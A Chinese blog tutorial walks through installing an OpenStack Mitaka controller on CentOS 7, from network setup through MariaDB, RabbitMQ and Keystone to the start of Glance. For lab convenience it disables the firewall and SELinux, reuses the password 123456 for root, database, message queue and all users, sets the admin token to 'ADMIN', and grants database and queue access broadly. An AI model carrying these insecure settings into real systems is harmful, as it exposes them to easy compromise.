<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/35@2_MMDCDOCC1FJ.png"><img class="wp-image-1457 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/35@2_MMDCDOCC1FJ.png" alt="3%~5@2_(}(MMD}CDOCC1F%J" width="567" height="546" /></a>

<p style="text-align: center;"><strong><span style="font-size: 12pt;">虚拟机网络设置</span></strong></p>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/FDEU7ZXCXDZX8N_9G@K.png"><img class="wp-image-1453 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/FDEU7ZXCXDZX8N_9G@K.png" alt="FD$}EU7ZXCXDZX8(N_{9G@K" width="572" height="559" /></a>

<p style="text-align: center;"><strong><code>注意点：<span style="color: #ff0000;">VMnet8</span>是<span style="color: #ff0000;">192.168.188.128</span>所在网卡，<span style="color: #ff0000;">VMnet0</span>是<span style="color: #ff0000;">10.0.0.2</span>所在网卡！</code></strong>
<!--nextpage--><!--more--></p>

<h6><span style="font-size: 18pt;">0x02  系统安装</span></h6>

<span style="font-size: 14pt;"><strong>安装步骤：</strong></span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/L2SLN0Q5BH7JDPDDLN8.png"><img class="wp-image-1454 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/L2SLN0Q5BH7JDPDDLN8.png" alt="L2SLN0Q))&#96;5BH7JDPD]DLN8" width="634" height="451" /></a>

<p style="text-align: center;"><strong><code>注意点：最小化安装。KDUMP可关可不关。</code></strong></p>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/7T9_5UPZ@14SZPMT3.png"><img class="wp-image-1455 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/7T9_5UPZ@14SZPMT3.png" alt="7T9})]_5}UPZ@1(4(SZPMT3" width="637" height="452" /></a>

<p style="text-align: center;"><strong><span style="font-size: 12pt;">正在安装，稍等5~10分钟。</span></strong></p>

<!--nextpage-->

<h6><span style="font-size: 18pt;">0x03  系统配置和安装必备软件</span></h6>

<span style="font-size: 14pt;"><strong>1、进入网卡配置文件修改配置：</strong></span>
<code>注意点：eno16777736是网卡一，eno33554960是网卡二。</code>
<strong>eno16777736：</strong>

<pre>vi /etc/sysconfig/network-srcipt/ifcfg-eno16777736</pre>

<span style="font-size: 12pt;">修改补充后：</span>

<pre>TYPE=Ethernet
BOOTPROTO=static
IPADDR0=192.168.188.128
GATEWAY0=192.168.188.2
PREFIX0=24
DNS1=114.114.114.114
DEFROUTE=yes
PEERDNS=yes
PEERROUTES=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_PEERDNS=yes
IPV6_PEERROUTES=yes
IPV6_FAILURE_FATAL=no
NAME=eno16777736
UUID=aafee099-3a7e-4945-99bd-40d32eb599a8
DEVICE=eno16777736
ONBOOT=yes</pre>

<span style="font-size: 12pt;">修改后截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/J0DDB_EFZ9L_HF6P_C.png"><img class="size-full wp-image-1458 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/J0DDB_EFZ9L_HF6P_C.png" alt="J0%DDB_EF}{Z9&#96;L_HF6P~_C" width="352" height="323" /></a>
&nbsp;
<strong>eno33554960：</strong>

<pre>vi /etc/sysconfig/network-srcipt/ifcfg-eno33554960</pre>

<span style="font-size: 12pt;">根据红字修改补充：</span>

<pre>TYPE=Ethernet
BOOTPROTO=static
IPADDR0=10.0.0.2
PREFIX0=24
DEFROUTE=yes
PEERDNS=yes
PEERROUTES=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_PEERDNS=yes
IPV6_PEERROUTES=yes
IPV6_FAILURE_FATAL=no
NAME=eno33554960
UUID=4cd6a251-e417-4416-9967-0326b20ccb9d
DEVICE=eno33554960
ONBOOT=yes</pre>

<span style="font-size: 12pt;">修改后截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/VQLKKZF0BY8ZF9AO8.png"><img class="size-full wp-image-1459 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/VQLKKZF0BY8ZF9AO8.png" alt="VQLK(KZF0{)BY$8%ZF9AO~8" width="339" height="300" /></a>
&nbsp;
<strong><span style="font-size: 12pt;">配置完成后执行：</span></strong>

<pre>systemctl restart network</pre>

&nbsp;
<strong><span style="font-size: 12pt;">使用Xshell连接CentOS，以便更好地操作。</span></strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/RWW37A4@24VUFNGVDJ.png"><img class="wp-image-1460 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/RWW37A4@24VUFNGVDJ.png" alt="RWW}3)7A4@2$4VUF~NGVD[J" width="913" height="585" /></a>
&nbsp;
<span style="font-size: 14pt;"><strong>2、测试网络连通性，安装 <code>net-tools</code> <code>vim</code> <code>wget</code> ：</strong></span>

<pre>yum install net-tools vim wget -y</pre>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/QEJNX931@Q3BTAGM43OY.png"><img class="wp-image-1461 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/QEJNX931@Q3BTAGM43OY.png" alt="QEJNX931@Q3}B${TAGM43OY" width="917" height="588" /></a>
<strong><span style="font-size: 12pt;">安装完毕用 <code>ifconfig</code> 查看网卡信息：</span></strong>

<pre>[root@localhost ~]# ifconfig
eno16777736: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500
 inet 192.168.188.128 netmask 255.255.255.0 broadcast 192.168.188.255
 inet6 fe80::20c:29ff:fefe:6840 prefixlen 64 scopeid 0x20&lt;link&gt;
 ether 00:0c:29:fe:68:40 txqueuelen 1000 (Ethernet)
 RX packets 25075 bytes 34998885 (33.3 MiB)
 RX errors 0 dropped 0 overruns 0 frame 0
 TX packets 10597 bytes 865346 (845.0 KiB)
 TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
eno33554960: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500
 inet 10.0.0.2 netmask 255.255.255.0 broadcast 10.0.0.255
 inet6 fe80::20c:29ff:fefe:684a prefixlen 64 scopeid 0x20&lt;link&gt;
 ether 00:0c:29:fe:68:4a txqueuelen 1000 (Ethernet)
 RX packets 38794 bytes 2328390 (2.2 MiB)
 RX errors 0 dropped 420 overruns 0 frame 0
 TX packets 7 bytes 528 (528.0 B)
 TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536
 inet 127.0.0.1 netmask 255.0.0.0
 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt;
 loop txqueuelen 0 (Local Loopback)
 RX packets 4 bytes 352 (352.0 B)
 RX errors 0 dropped 0 overruns 0 frame 0
 TX packets 4 bytes 352 (352.0 B)
 TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</pre>

&nbsp;
<strong><span style="font-size: 14pt;">3、上传openstack-mitaka，配置openstack本地源并替换阿里云源：</span></strong>
<span style="font-size: 12pt;">替换阿里云源：</span>

<pre>rm /etc/yum.repos.d/*
/*一直y确认回车*/
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo
wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo
/*下载后更新yum缓存，需等待一段时间，提示 元数据缓存已建立 即可*/
yum makecache</pre>

<span style="font-size: 12pt;">将openstack-mitaka源上传至mnt（其他目录例如media也可），并设置openstack源：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/1KNIY5U@@WZBFMZDC_K.png"><img class="wp-image-1463 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/1KNIY5U@@WZBFMZDC_K.png" alt="%1KN]IY5U@@W%ZBFM(ZDC_K" width="890" height="501" /></a>

<pre>vim /etc/yum.repos.d/openstack.repo</pre>

源：

<pre>[openstack]
name=openstack
baseurl=file:///mnt/openstack-mitaka
enable=1
gpgcheck=0</pre>

&nbsp;
<span style="font-size: 14pt;"><strong>4、设置hostname：</strong></span>

<pre>hostnamectl --static set-hostname controller</pre>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/Y4GEKZF_Z_MFX47T6.png"><img class="wp-image-1462 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/Y4GEKZF_Z_MFX47T6.png" alt=")Y4G&#96;$E[KZF_Z_~MFX4%7T6" width="950" height="609" /></a>
&nbsp;
<span style="font-size: 14pt;"><strong>5、修改hosts文件：</strong></span>

<pre>vim /etc/hosts</pre>

<span style="font-size: 12pt;">添加以下配置，如有多个compute请加入至hosts中：</span>

<pre>192.168.188.128 controller
192.168.188.129 compute</pre>

&nbsp;
<strong><span style="font-size: 14pt;">6、安装NTP同步时间软件：</span></strong>

<pre>yum install chrony -y</pre>

<span style="font-size: 12pt;">配置NTP：</span>

<pre>sed -i 's/^restrict default\ nomodify\ notrap\ nopeer\ noquery/restrict\ default\ nomodify\ /' /etc/chrony.conf
sed -i "/^# Please\ consider\ joining\ the\ pool/iserver\ ${HOSTNAME}\ iburst " /etc/chrony.conf</pre>

<span style="font-size: 12pt;">设置NTP开机启动、启动NTP、查看NTP状态：</span>

<pre>systemctl enable chronyd.service
systemctl start chronyd.service
systemctl status chronyd.service
/*active (running)即成功*/</pre>

&nbsp;
<strong><span style="font-size: 14pt;">7、关闭防火墙和关闭 selinux</span></strong>
<span style="font-size: 12pt;">关闭防火墙：</span>

<pre>systemctl disable firewalld.service
systemctl stop firewalld.service</pre>

<span style="font-size: 12pt;">关闭selinux：</span>

<pre>vim /etc/selinux/config</pre>

<span style="font-size: 12pt;">修改配置文件：</span>

<pre>SELINUX=disabled</pre>

&nbsp;
<strong><span style="font-size: 14pt;">8、更新系统：
</span></strong>

<pre>yum update -y</pre>

<strong><span style="font-size: 12pt;">更新完毕后重启系统。（顺便做个快照）</span></strong>
<!--nextpage-->

<h6><span style="font-size: 18pt;">0x04  安装 Mariadb 和 RabbitMQ</span></h6>

<strong><span style="font-size: 14pt;">1、安装 python-openstackclient 和 openstack-selinux
</span></strong>

<pre>yum install -y python-openstackclient openstack-selinux</pre>

<strong><span style="font-size: 14pt;">2、安装 Mariadb 数据库</span></strong>

<pre>yum install -y mariadb mariadb-server python2-PyMySQL</pre>

<span style="font-size: 14pt;"><strong>3、配置 Mariadb</strong></span>

<pre>vim /etc/my.cnf.d/mariadb_oepnstack.cnf</pre>

<span style="font-size: 12pt;">输入：</span>

<pre>[mysqld]
default-storage-engine = innodb
innodb_file_per_table
collation-server = utf8_general_ci
init-connect = 'SET NAMES utf8'
character-set-server = utf8
bind-address = 192.168.188.128</pre>

<span style="font-size: 12pt;">配置Mariadb数据库开机启动，启动Mariadb数据库并查看状态：</span>

<pre>systemctl enable mariadb.service
systemctl restart mariadb.service
systemctl status mariadb.service</pre>

<strong><span style="font-size: 14pt;">4、设置 Mariadb 登录密码</span></strong>

<pre>mysql_secure_installation</pre>

<span style="font-size: 12pt;">先按下回车，接着按y回车，然后就是设置密码，设置完毕后一直按y直到结束。</span>
<span style="font-size: 12pt;">我这里把密码设置为 </span><span style="color: #ff0000;"><strong><code>123456</code></strong></span><span style="font-size: 12pt;"> 。登录数据库测试：</span>

<pre>mysql -uroot -p123456</pre>

进入即成功。
<strong><span style="font-size: 14pt;">5、安装 rabbitmq-server</span></strong>

<pre>yum install -y rabbitmq-server</pre>

<span style="font-size: 14pt;"><strong>6、设置 RabbitMQ开机启动，开启 RabbitMQ 和查看状态，并查看监听端口</strong></span>

<pre>systemctl enable rabbitmq-server.service
systemctl restart rabbitmq-server.service
systemctl status rabbitmq-server.service</pre>

<span style="font-size: 12pt;">查看监听端口：</span>

<pre>netstat -ntlp | grep 5672</pre>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/75W9HST7_UOJX6WYL4I.png"><img class="size-full wp-image-1465 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/75W9HST7_UOJX6WYL4I.png" alt="{$75W9%HST7_UOJX6WYL4$I" width="857" height="64" /></a>
<span style="font-size: 14pt;"><strong>7、在 RabbitMQ 上创建 openstack 用户和设置密码（123456），并给 openstack 用户赋予权限</strong></span>

<pre>rabbitmqctl add_user openstack 123456</pre>

<pre>rabbitmqctl set_permissions openstack ".*" ".*" ".*"</pre>

<span style="font-size: 12pt;">执行截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/1JI4QE7572OMUAIPY.png"><img class="size-full wp-image-1464 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/1JI4QE7572OMUAIPY.png" alt="[1(JI4QE]~$7572OMUAI$PY" width="684" height="85" /></a>
<strong><span style="font-size: 14pt;">8、查看 RabbitMQ 插件并启动 RabbitMQ 相关插件</span></strong>
<span style="font-size: 12pt;">查看插件：</span>

<pre>/usr/lib/rabbitmq/bin/rabbitmq-plugins list</pre>

<span style="font-size: 12pt;">执行截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/NH7JDPJT4ZV63RAB7K7.png"><img class="wp-image-1466 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/NH7JDPJT4ZV63RAB7K7.png" alt="NH7~JDPJT)4ZV63R{A~B7K7" width="538" height="501" /></a>
<span style="font-size: 12pt;">启动插件：</span>

<pre>/usr/lib/rabbitmq/bin/rabbitmq-plugins enable rabbitmq_management</pre>

<span style="font-size: 12pt;">执行截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/PW9NGJQHFTJ2JNLC2X8.png"><img class="wp-image-1467 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/PW9NGJQHFTJ2JNLC2X8.png" alt="$PW9&#96;NG)JQHFTJ2JNL(C2X8" width="668" height="251" /></a>
<strong><span style="font-size: 14pt;">9、浏览器访问 RabbitMQ Web 界面</span></strong>
<span style="font-size: 12pt;">先重启一下RabbitMQ：</span>

<pre>systemctl restart rabbitmq-server.service</pre>

<span style="font-size: 12pt;">在浏览器输入 <code>http://192.168.188.128:15672</code> ，帐号密码皆为 <code>guest</code></span>
<span style="font-size: 12pt;">访问结果：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/3M15BJV3U6H6G9CJF.png"><img class="wp-image-1468 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/3M15BJV3U6H6G9CJF.png" alt="{3M15BJV3[U6}H6$G9](CJF" width="1001" height="538" /></a>
<strong><span style="font-size: 14pt;">10、安装 Memcached 缓存</span></strong>
<span style="font-size: 12pt;">安装 memcached：</span>

<pre>yum install memcached python-memcached -y</pre>

<span style="font-size: 12pt;">重启 memcached 服务：</span>

<pre>systemctl enable memcached.service
systemctl restart memcached.service</pre>

<!--nextpage-->

<h6><span style="font-size: 18pt;">0x05  安装 Keystone</span></h6>

<strong><span style="font-size: 14pt;">1、创建 Keystone 数据库，并创建数据库用户以及赋予权限</span></strong>
<span style="font-size: 12pt;">密码为 <code>123456</code></span>

<pre>mysql -uroot -p123456 -e "CREATE DATABASE keystone;"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON keystone.* TO 'keystone'@'localhost' IDENTIFIED BY '123456';"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON keystone.* TO 'keystone'@'%' IDENTIFIED BY '123456';"</pre>

<strong><span style="font-size: 14pt;">2、安装 Keystone，设置开机启动并启动 Keystone</span></strong>

<pre>yum install -y openstack-keystone httpd mod_wsgi memcached python-memcached</pre>

<strong><span style="font-size: 14pt;">3、设置 memcached 开机启动，并启动 memcached 和查看状态</span></strong>

<pre>systemctl enable memcached.service
systemctl restart memcached.service
systemctl status memcached.service</pre>

<strong><span style="font-size: 14pt;">4、安装 openstack 文件配置工具</span></strong>

<pre>yum install -y openstack-utils</pre>

<strong><span style="font-size: 14pt;">5、生成TOKEN</span></strong>

<pre>ADMIN_TOKEN=ADMIN</pre>

<span style="font-size: 12pt;">ADMIN只是我随便输入而已，可以替换成任何字符串。</span>
<strong><span style="font-size: 14pt;">6、配置 keystone</span></strong>
<span style="font-size: 12pt;">密码为 <code>123456</code></span>

<pre>openstack-config --set /etc/keystone/keystone.conf DEFAULT admin_token $ADMIN_TOKEN
openstack-config --set /etc/keystone/keystone.conf database connection mysql://keystone:123456@$HOSTNAME/keystone
openstack-config --set /etc/keystone/keystone.conf token provider fernet</pre>

<span style="font-size: 12pt;">注意红字为数据库密码。</span>
<strong><span style="font-size: 14pt;">7、同步 Keystone 数据库</span></strong>

<pre>su -s /bin/sh -c "keystone-manage db_sync" keystone</pre>

<span style="font-size: 12pt;">无信息返回则成功。</span>
<strong><span style="font-size: 14pt;">8、初始化 fernet 密钥（用于认证，也有其他认证方式）</span></strong>

<pre>keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone</pre>

<span style="font-size: 12pt;">无信息返回则成功。</span>
<span style="font-size: 14pt;"><strong>9、配置 httpd 并 创建 /etc/httpd/conf.d/wsgi-keystone.conf 配置文件</strong></span>

<pre>sed -i "s/#ServerName www.example.com:80/ServerName ${HOSTNAME}/" /etc/httpd/conf/httpd.conf</pre>

<span style="font-size: 12pt;">创建 /etc/httpd/conf.d/wsgi-keystone.conf 配置文件：</span>

<pre>vim /etc/httpd/conf.d/wsgi-keystone.conf</pre>

<span style="font-size: 12pt;"><strong>因为wordpress会对'&lt;'、'&gt;'等符号进行编码且配置代码过长，所以提供配置文件下载</strong>：<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/wsgi-keystone.conf_.txt">wsgi-keystone.conf
</a></span>
<span style="font-size: 14pt;"><strong>10、设置 httpd 开机启动，并启动 httpd 和查看状态</strong></span>

<pre>systemctl enable httpd.service
systemctl restart httpd.service
systemctl status httpd.service</pre>

<strong><span style="font-size: 14pt;">11、设置环境变量</span></strong>

<pre>export OS_TOKEN=ADMIN
export OS_URL=http://${HOSTNAME}:35357/v3
export OS_IDENTITY_API_VERSION=3</pre>

<strong><span style="font-size: 12pt;">OS_TOKEN和之前ADMIN_TOKEN一致。</span></strong>
<strong><span style="font-size: 14pt;">12、创建 Keystone 服务以及创建 endpoint</span></strong>
<strong><span style="font-size: 12pt;">创建 Keystone 服务：</span></strong>

<pre>openstack service create --name keystone --description "OpenStack Identity" identity</pre>

<span style="font-size: 12pt;">执行截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/4CK9MPHGZD@1FXV9N5UO8.png"><img class="wp-image-1470 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/4CK9MPHGZD@1FXV9N5UO8.png" alt="4CK9MPHGZD@1]FXV9N5UO]8" width="850" height="168" /></a>
<span style="font-size: 12pt;"><strong>创建 endpoint ：</strong>
</span>
<span style="font-size: 12pt;"><strong>Region</strong> 相当于一个区域，每个 <strong>Region</strong> 之间完全隔离，每个 <strong>Region</strong> 都可以有自己的 <strong>endpoint</strong> 。但每个 <strong>Region</strong> 都使用同一个 <strong>Keystone</strong> 和 <strong>Dashboard</strong> 进行管理。 <code>RegionOne</code> 是 <strong>OpenStack</strong> 默认的 <strong>Region</strong> 。</span>

<pre>openstack endpoint create --region RegionOne identity public http://${HOSTNAME}:5000/v3
openstack endpoint create --region RegionOne identity internal http://${HOSTNAME}:5000/v3
openstack endpoint create --region RegionOne identity admin http://${HOSTNAME}:35357/v3</pre>

<span style="font-size: 12pt;">执行截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/1RQ193OD4P5N7PLP0.png"><img class="wp-image-1471 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/1RQ193OD4P5N7PLP0.png" alt="1RQ19$3%~O([D4P5N7P}LP0" width="694" height="559" /></a>
<strong><span style="font-size: 14pt;">13、创建 admin 项目、admin 用户以及给 admin 用户赋予 admin 角色</span></strong>
<strong><span style="font-size: 12pt;">创建 admin 项目：</span></strong>

<pre>openstack domain create --description "Default Domain" default
openstack project create --domain default --description "Admin Project" admin</pre>

<span style="font-size: 12pt;">执行截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/M2VN0KBGCHFWX8EM867BE7.png"><img class="wp-image-1472 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/M2VN0KBGCHFWX8EM867BE7.png" alt="M2&#96;VN0KBGCHFWX8EM867BE7" width="597" height="267" /></a>
<strong><span style="font-size: 12pt;">创建 admin 用户：</span></strong>
密码为 <code>123456</code>

<pre>openstack user create --domain default admin --password 123456</pre>

<span style="font-size: 12pt;">执行截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/TGOFK0AO9QCX@Q9XC6HE9.png"><img class="wp-image-1473 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/TGOFK0AO9QCX@Q9XC6HE9.png" alt="TGOFK0AO9QC]X%@Q9XC6HE9" width="626" height="144" /></a>
<strong><span style="font-size: 12pt;">给 admin 用户赋予 admin 角色：</span></strong>

<pre>openstack role create admin
openstack role add --project admin --user admin admin</pre>

<span style="font-size: 12pt;">执行截图：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/ES_C_H0KRA3_0U2WE.png"><img class="wp-image-1474 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/ES_C_H0KRA3_0U2WE.png" alt="ES_])C{_H0KRA]$3_0U2W{E" width="621" height="323" /></a>
<strong><span style="font-size: 14pt;">14、创建 service 项目</span></strong>

<pre>openstack project create --domain default --description "Service Project" service</pre>

<span style="font-size: 12pt;">实际执行：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/8U00N532YW4O1MNRR6.png"><img class="wp-image-1475 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/8U00N532YW4O1MNRR6.png" alt="8U%00N%5)32}YW4O1[MNRR6" width="725" height="184" /></a>
<strong><span style="font-size: 14pt;">15、创建 demo 项目 和 创建 demo 用户</span></strong>
密码为 <code>123456</code>

<pre>openstack project create --domain default --description "Demo Project" demo
openstack user create --domain default demo --password 123456</pre>

<span style="font-size: 12pt;">实际执行：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/11HB5QX2SHR25WW48W.png"><img class="wp-image-1476 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/11HB5QX2SHR25WW48W.png" alt="11HB5QX2S%HR2%]5]WW)48W" width="706" height="350" /></a>
<span style="font-size: 14pt;"><strong>16、创建 user 角色并给 demo 用户赋予 user 角色</strong></span>

<pre>openstack role create user
openstack role add --project demo --user demo user</pre>

<span style="font-size: 12pt;">实际执行：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/XCWLXVDGZ5J50LR4TO.png"><img class="wp-image-1477 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/XCWLXVDGZ5J50LR4TO.png" alt="X}CWLXVD~G&#96;Z5J50~LR4&#96;TO" width="590" height="175" /></a>
<strong><span style="font-size: 14pt;">17、验证 keystone</span></strong>
密码为 <code>123456</code>

<pre>unset OS_TOKEN OS_URL
openstack --os-auth-url http://controller:35357/v3 --os-project-domain-name default \
--os-user-domain-name default --os-project-name admin --os-username admin token issue --os-password 123456
openstack --os-auth-url http://controller:5000/v3 --os-project-domain-name default \
--os-user-domain-name default --os-project-name demo --os-username demo token issue --os-password 123456</pre>

<span style="font-size: 12pt;">实际执行：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/20HZQA9YGXH29T753J0.png"><img class="wp-image-1478 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/20HZQA9YGXH29T753J0.png" alt="20HZ(}&#96;QA9YG&#96;XH29T753J0" width="980" height="342" /></a>
&nbsp;
<span style="font-size: 14pt;"><strong>18、创建 admin 用户变量脚本文件、demo 用户变量脚本文件</strong></span>
<span style="font-size: 12pt;">变量脚本最常用于当服务器重启后，执行openstack命令时报错。</span>
<span style="font-size: 12pt;">我习惯保存在root目录下。</span>
<span style="font-size: 12pt;"><strong>admin-openrc.sh：</strong></span>

<pre>vim ~/admin-openrc.sh</pre>

<span style="font-size: 12pt;">输入：</span>
密码为 <code>123456</code>

<pre>export OS_PROJECT_DOMAIN_NAME=default
export OS_USER_DOMAIN_NAME=default
export OS_PROJECT_NAME=admin
export OS_USERNAME=admin
export OS_AUTH_URL=http://${HOSTNAME}:35357/v3
export OS_IDENTITY_API_VERSION=3
export OS_PASSWORD=123456</pre>

<strong><span style="font-size: 12pt;">demo-openrc.sh：</span></strong>

<pre>vim ~/demo-openrc.sh</pre>

<span style="font-size: 12pt;">输入：</span>
密码为 <code>123456</code>

<pre>export OS_PROJECT_DOMAIN_NAME=default
export OS_USER_DOMAIN_NAME=default
export OS_PROJECT_NAME=demo
export OS_USERNAME=demo
export OS_AUTH_URL=http://${HOSTNAME}:5000/v3
export OS_IDENTITY_API_VERSION=3
export OS_PASSWORD=123456</pre>

&nbsp;
<strong><span style="font-size: 14pt;">最后检查：</span></strong>

<pre>[root@controller ~]# openstack user list
+----------------------------------+-------+
| ID                               | Name  |
+----------------------------------+-------+
| a0775b2582b24d85a2f0b0fb9c7cb471 | admin |
| b196be66c67a4347abdc62d4799029e7 | demo  |
+----------------------------------+-------+
[root@controller ~]# openstack service list
+----------------------------------+----------+----------+
| ID                               |   Name   |   Type   |
+----------------------------------+----------+----------+
| 4d591f92632f45fbaed1b785b33dfd86 | keystone | identity |
+----------------------------------+----------+----------+
[root@controller ~]# openstack role list
+----------------------------------+-------+
| ID                               | Name  |
+----------------------------------+-------+
| 00287d12a61f44b9900f34fc82ac6e5e | admin |
| a71949c9e4f74a4e9edc54fb958ea6a5 | user  |
+----------------------------------+-------+
[root@controller ~]# openstack domain list
+----------------------------------+---------+---------+----------------+
| ID                               |   Name  | Enabled |  Description   |
+----------------------------------+---------+---------+----------------+
| 46785d4eb28741aa883027ba88a8f6f2 | default |   True  | Default Domain |
+----------------------------------+---------+---------+----------------+
[root@controller ~]# openstack endpoint list
+----------------------------------+-----------+--------------+--------------+---------+-----------+----------------------------+
| ID                               | Region    | Service Name | Service Type | Enabled | Interface | URL                        |
+----------------------------------+-----------+--------------+--------------+---------+-----------+----------------------------+
| 08bb0dc1e35b4acdb4495a36a8f1e1cc | RegionOne | keystone     |   identity   |  True   | public    | http://controller:5000/v3  |
| 2b741d67267a4bc29ee20bdc3e6fd76b | RegionOne | keystone     |   identity   |  True   | internal  | http://controller:5000/v3  |
| 457a01e3ed28415f82b6b042d9bf38bc | RegionOne | keystone     |   identity   |  True   | admin     | http://controller:35357/v3 |
+----------------------------------+-----------+--------------+--------------+---------+-----------+----------------------------+
[root@controller ~]# openstack project list
+----------------------------------+---------+
| ID                               |  Name   |
+----------------------------------+---------+
| 81e04b79a54d454aa524ac4cd726dadf | admin   |
| b5a3180c070a45dcaa343baa24be4509 | service |
| c9bb3205d20442d8bfdf8541ec795fff | demo    |
+----------------------------------+---------+</pre>

<!--nextpage-->

<h6><span style="font-size: 18pt;">0x06  安装 Glance</span></h6>

<strong><span style="font-size: 14pt;">1、创建 Glance 数据库，并创建数据库用户以及赋予权限</span></strong>
密码为 <code>123456</code>

<pre>mysql -uroot -p123456 -e "CREATE DATABASE glance;"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON glance.* TO 'glance'@'localhost' IDENTIFIED BY '123456';"
mysql -uroot -p123456 -e "GRANT ALL PRIVILEGES ON glance.* TO 'glance'@'%' IDENTIFIED BY '123456';"</pre>

<strong><span style="font-size: 14pt;">2、创建 glance 用户并赋予 admin 权限</span></strong>
<span style="font-size: 12pt;">先执行环境变量脚本：</span>

<pre>source ~/admin-openrc.sh</pre>

密码为 <code>123456</code>

<pre>openstack user create --domain default glance --password 123456
openstack role add --project service --user glance admin</pre>

<span style="font-size: 12pt;">实际执行：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/E29NYD60UBSCRUL7E4M5.png"><img class=" wp-image-1479 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/E29NYD60UBSCRUL7E4M5.png" alt="E29NY{D60UB{SCR]UL7E4M5" width="668" height="189" /></a>
<strong><span style="font-size: 14pt;">3、创建 image 服务，创建 glance 的 endpoint</span></strong>
<span style="font-size: 12pt;"><strong>创建 image 服务：</strong></span>

<pre>openstack service create --name glance --description "OpenStack Image service" image</pre>

<span style="font-size: 12pt;">实际执行：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/QQW0IXADK9X3KQK6L.png"><img class="wp-image-1480 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/QQW0IXADK9X3KQK6L.png" alt="Q(QW0IXADK9X3K([QK$%6~L" width="801" height="187" /></a>
<span style="font-size: 12pt;"><strong>创建 glance 的 endpoint：</strong></span>

<pre>openstack endpoint create --region RegionOne image public http://${HOSTNAME}:9292
openstack endpoint create --region RegionOne image internal http://${HOSTNAME}:9292
openstack endpoint create --region RegionOne image admin http://${HOSTNAME}:9292</pre>

<span style="font-size: 12pt;">实际执行：</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/R7IS065LW40YP_YGRQ5.png"><img class="wp-image-1481 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/R7IS065LW40YP_YGRQ5.png" alt="]R7IS0]65&#96;L[W40YP_YGRQ5" width="733" height="622" /></a>
<span style="font-size: 14pt;"><strong>4、安装 glance</strong></span>

<pre>yum install -y openstack-glance python-glance python-glanceclient</pre>

<strong><span style="font-size: 14pt;">5、配置 glance</span></strong>
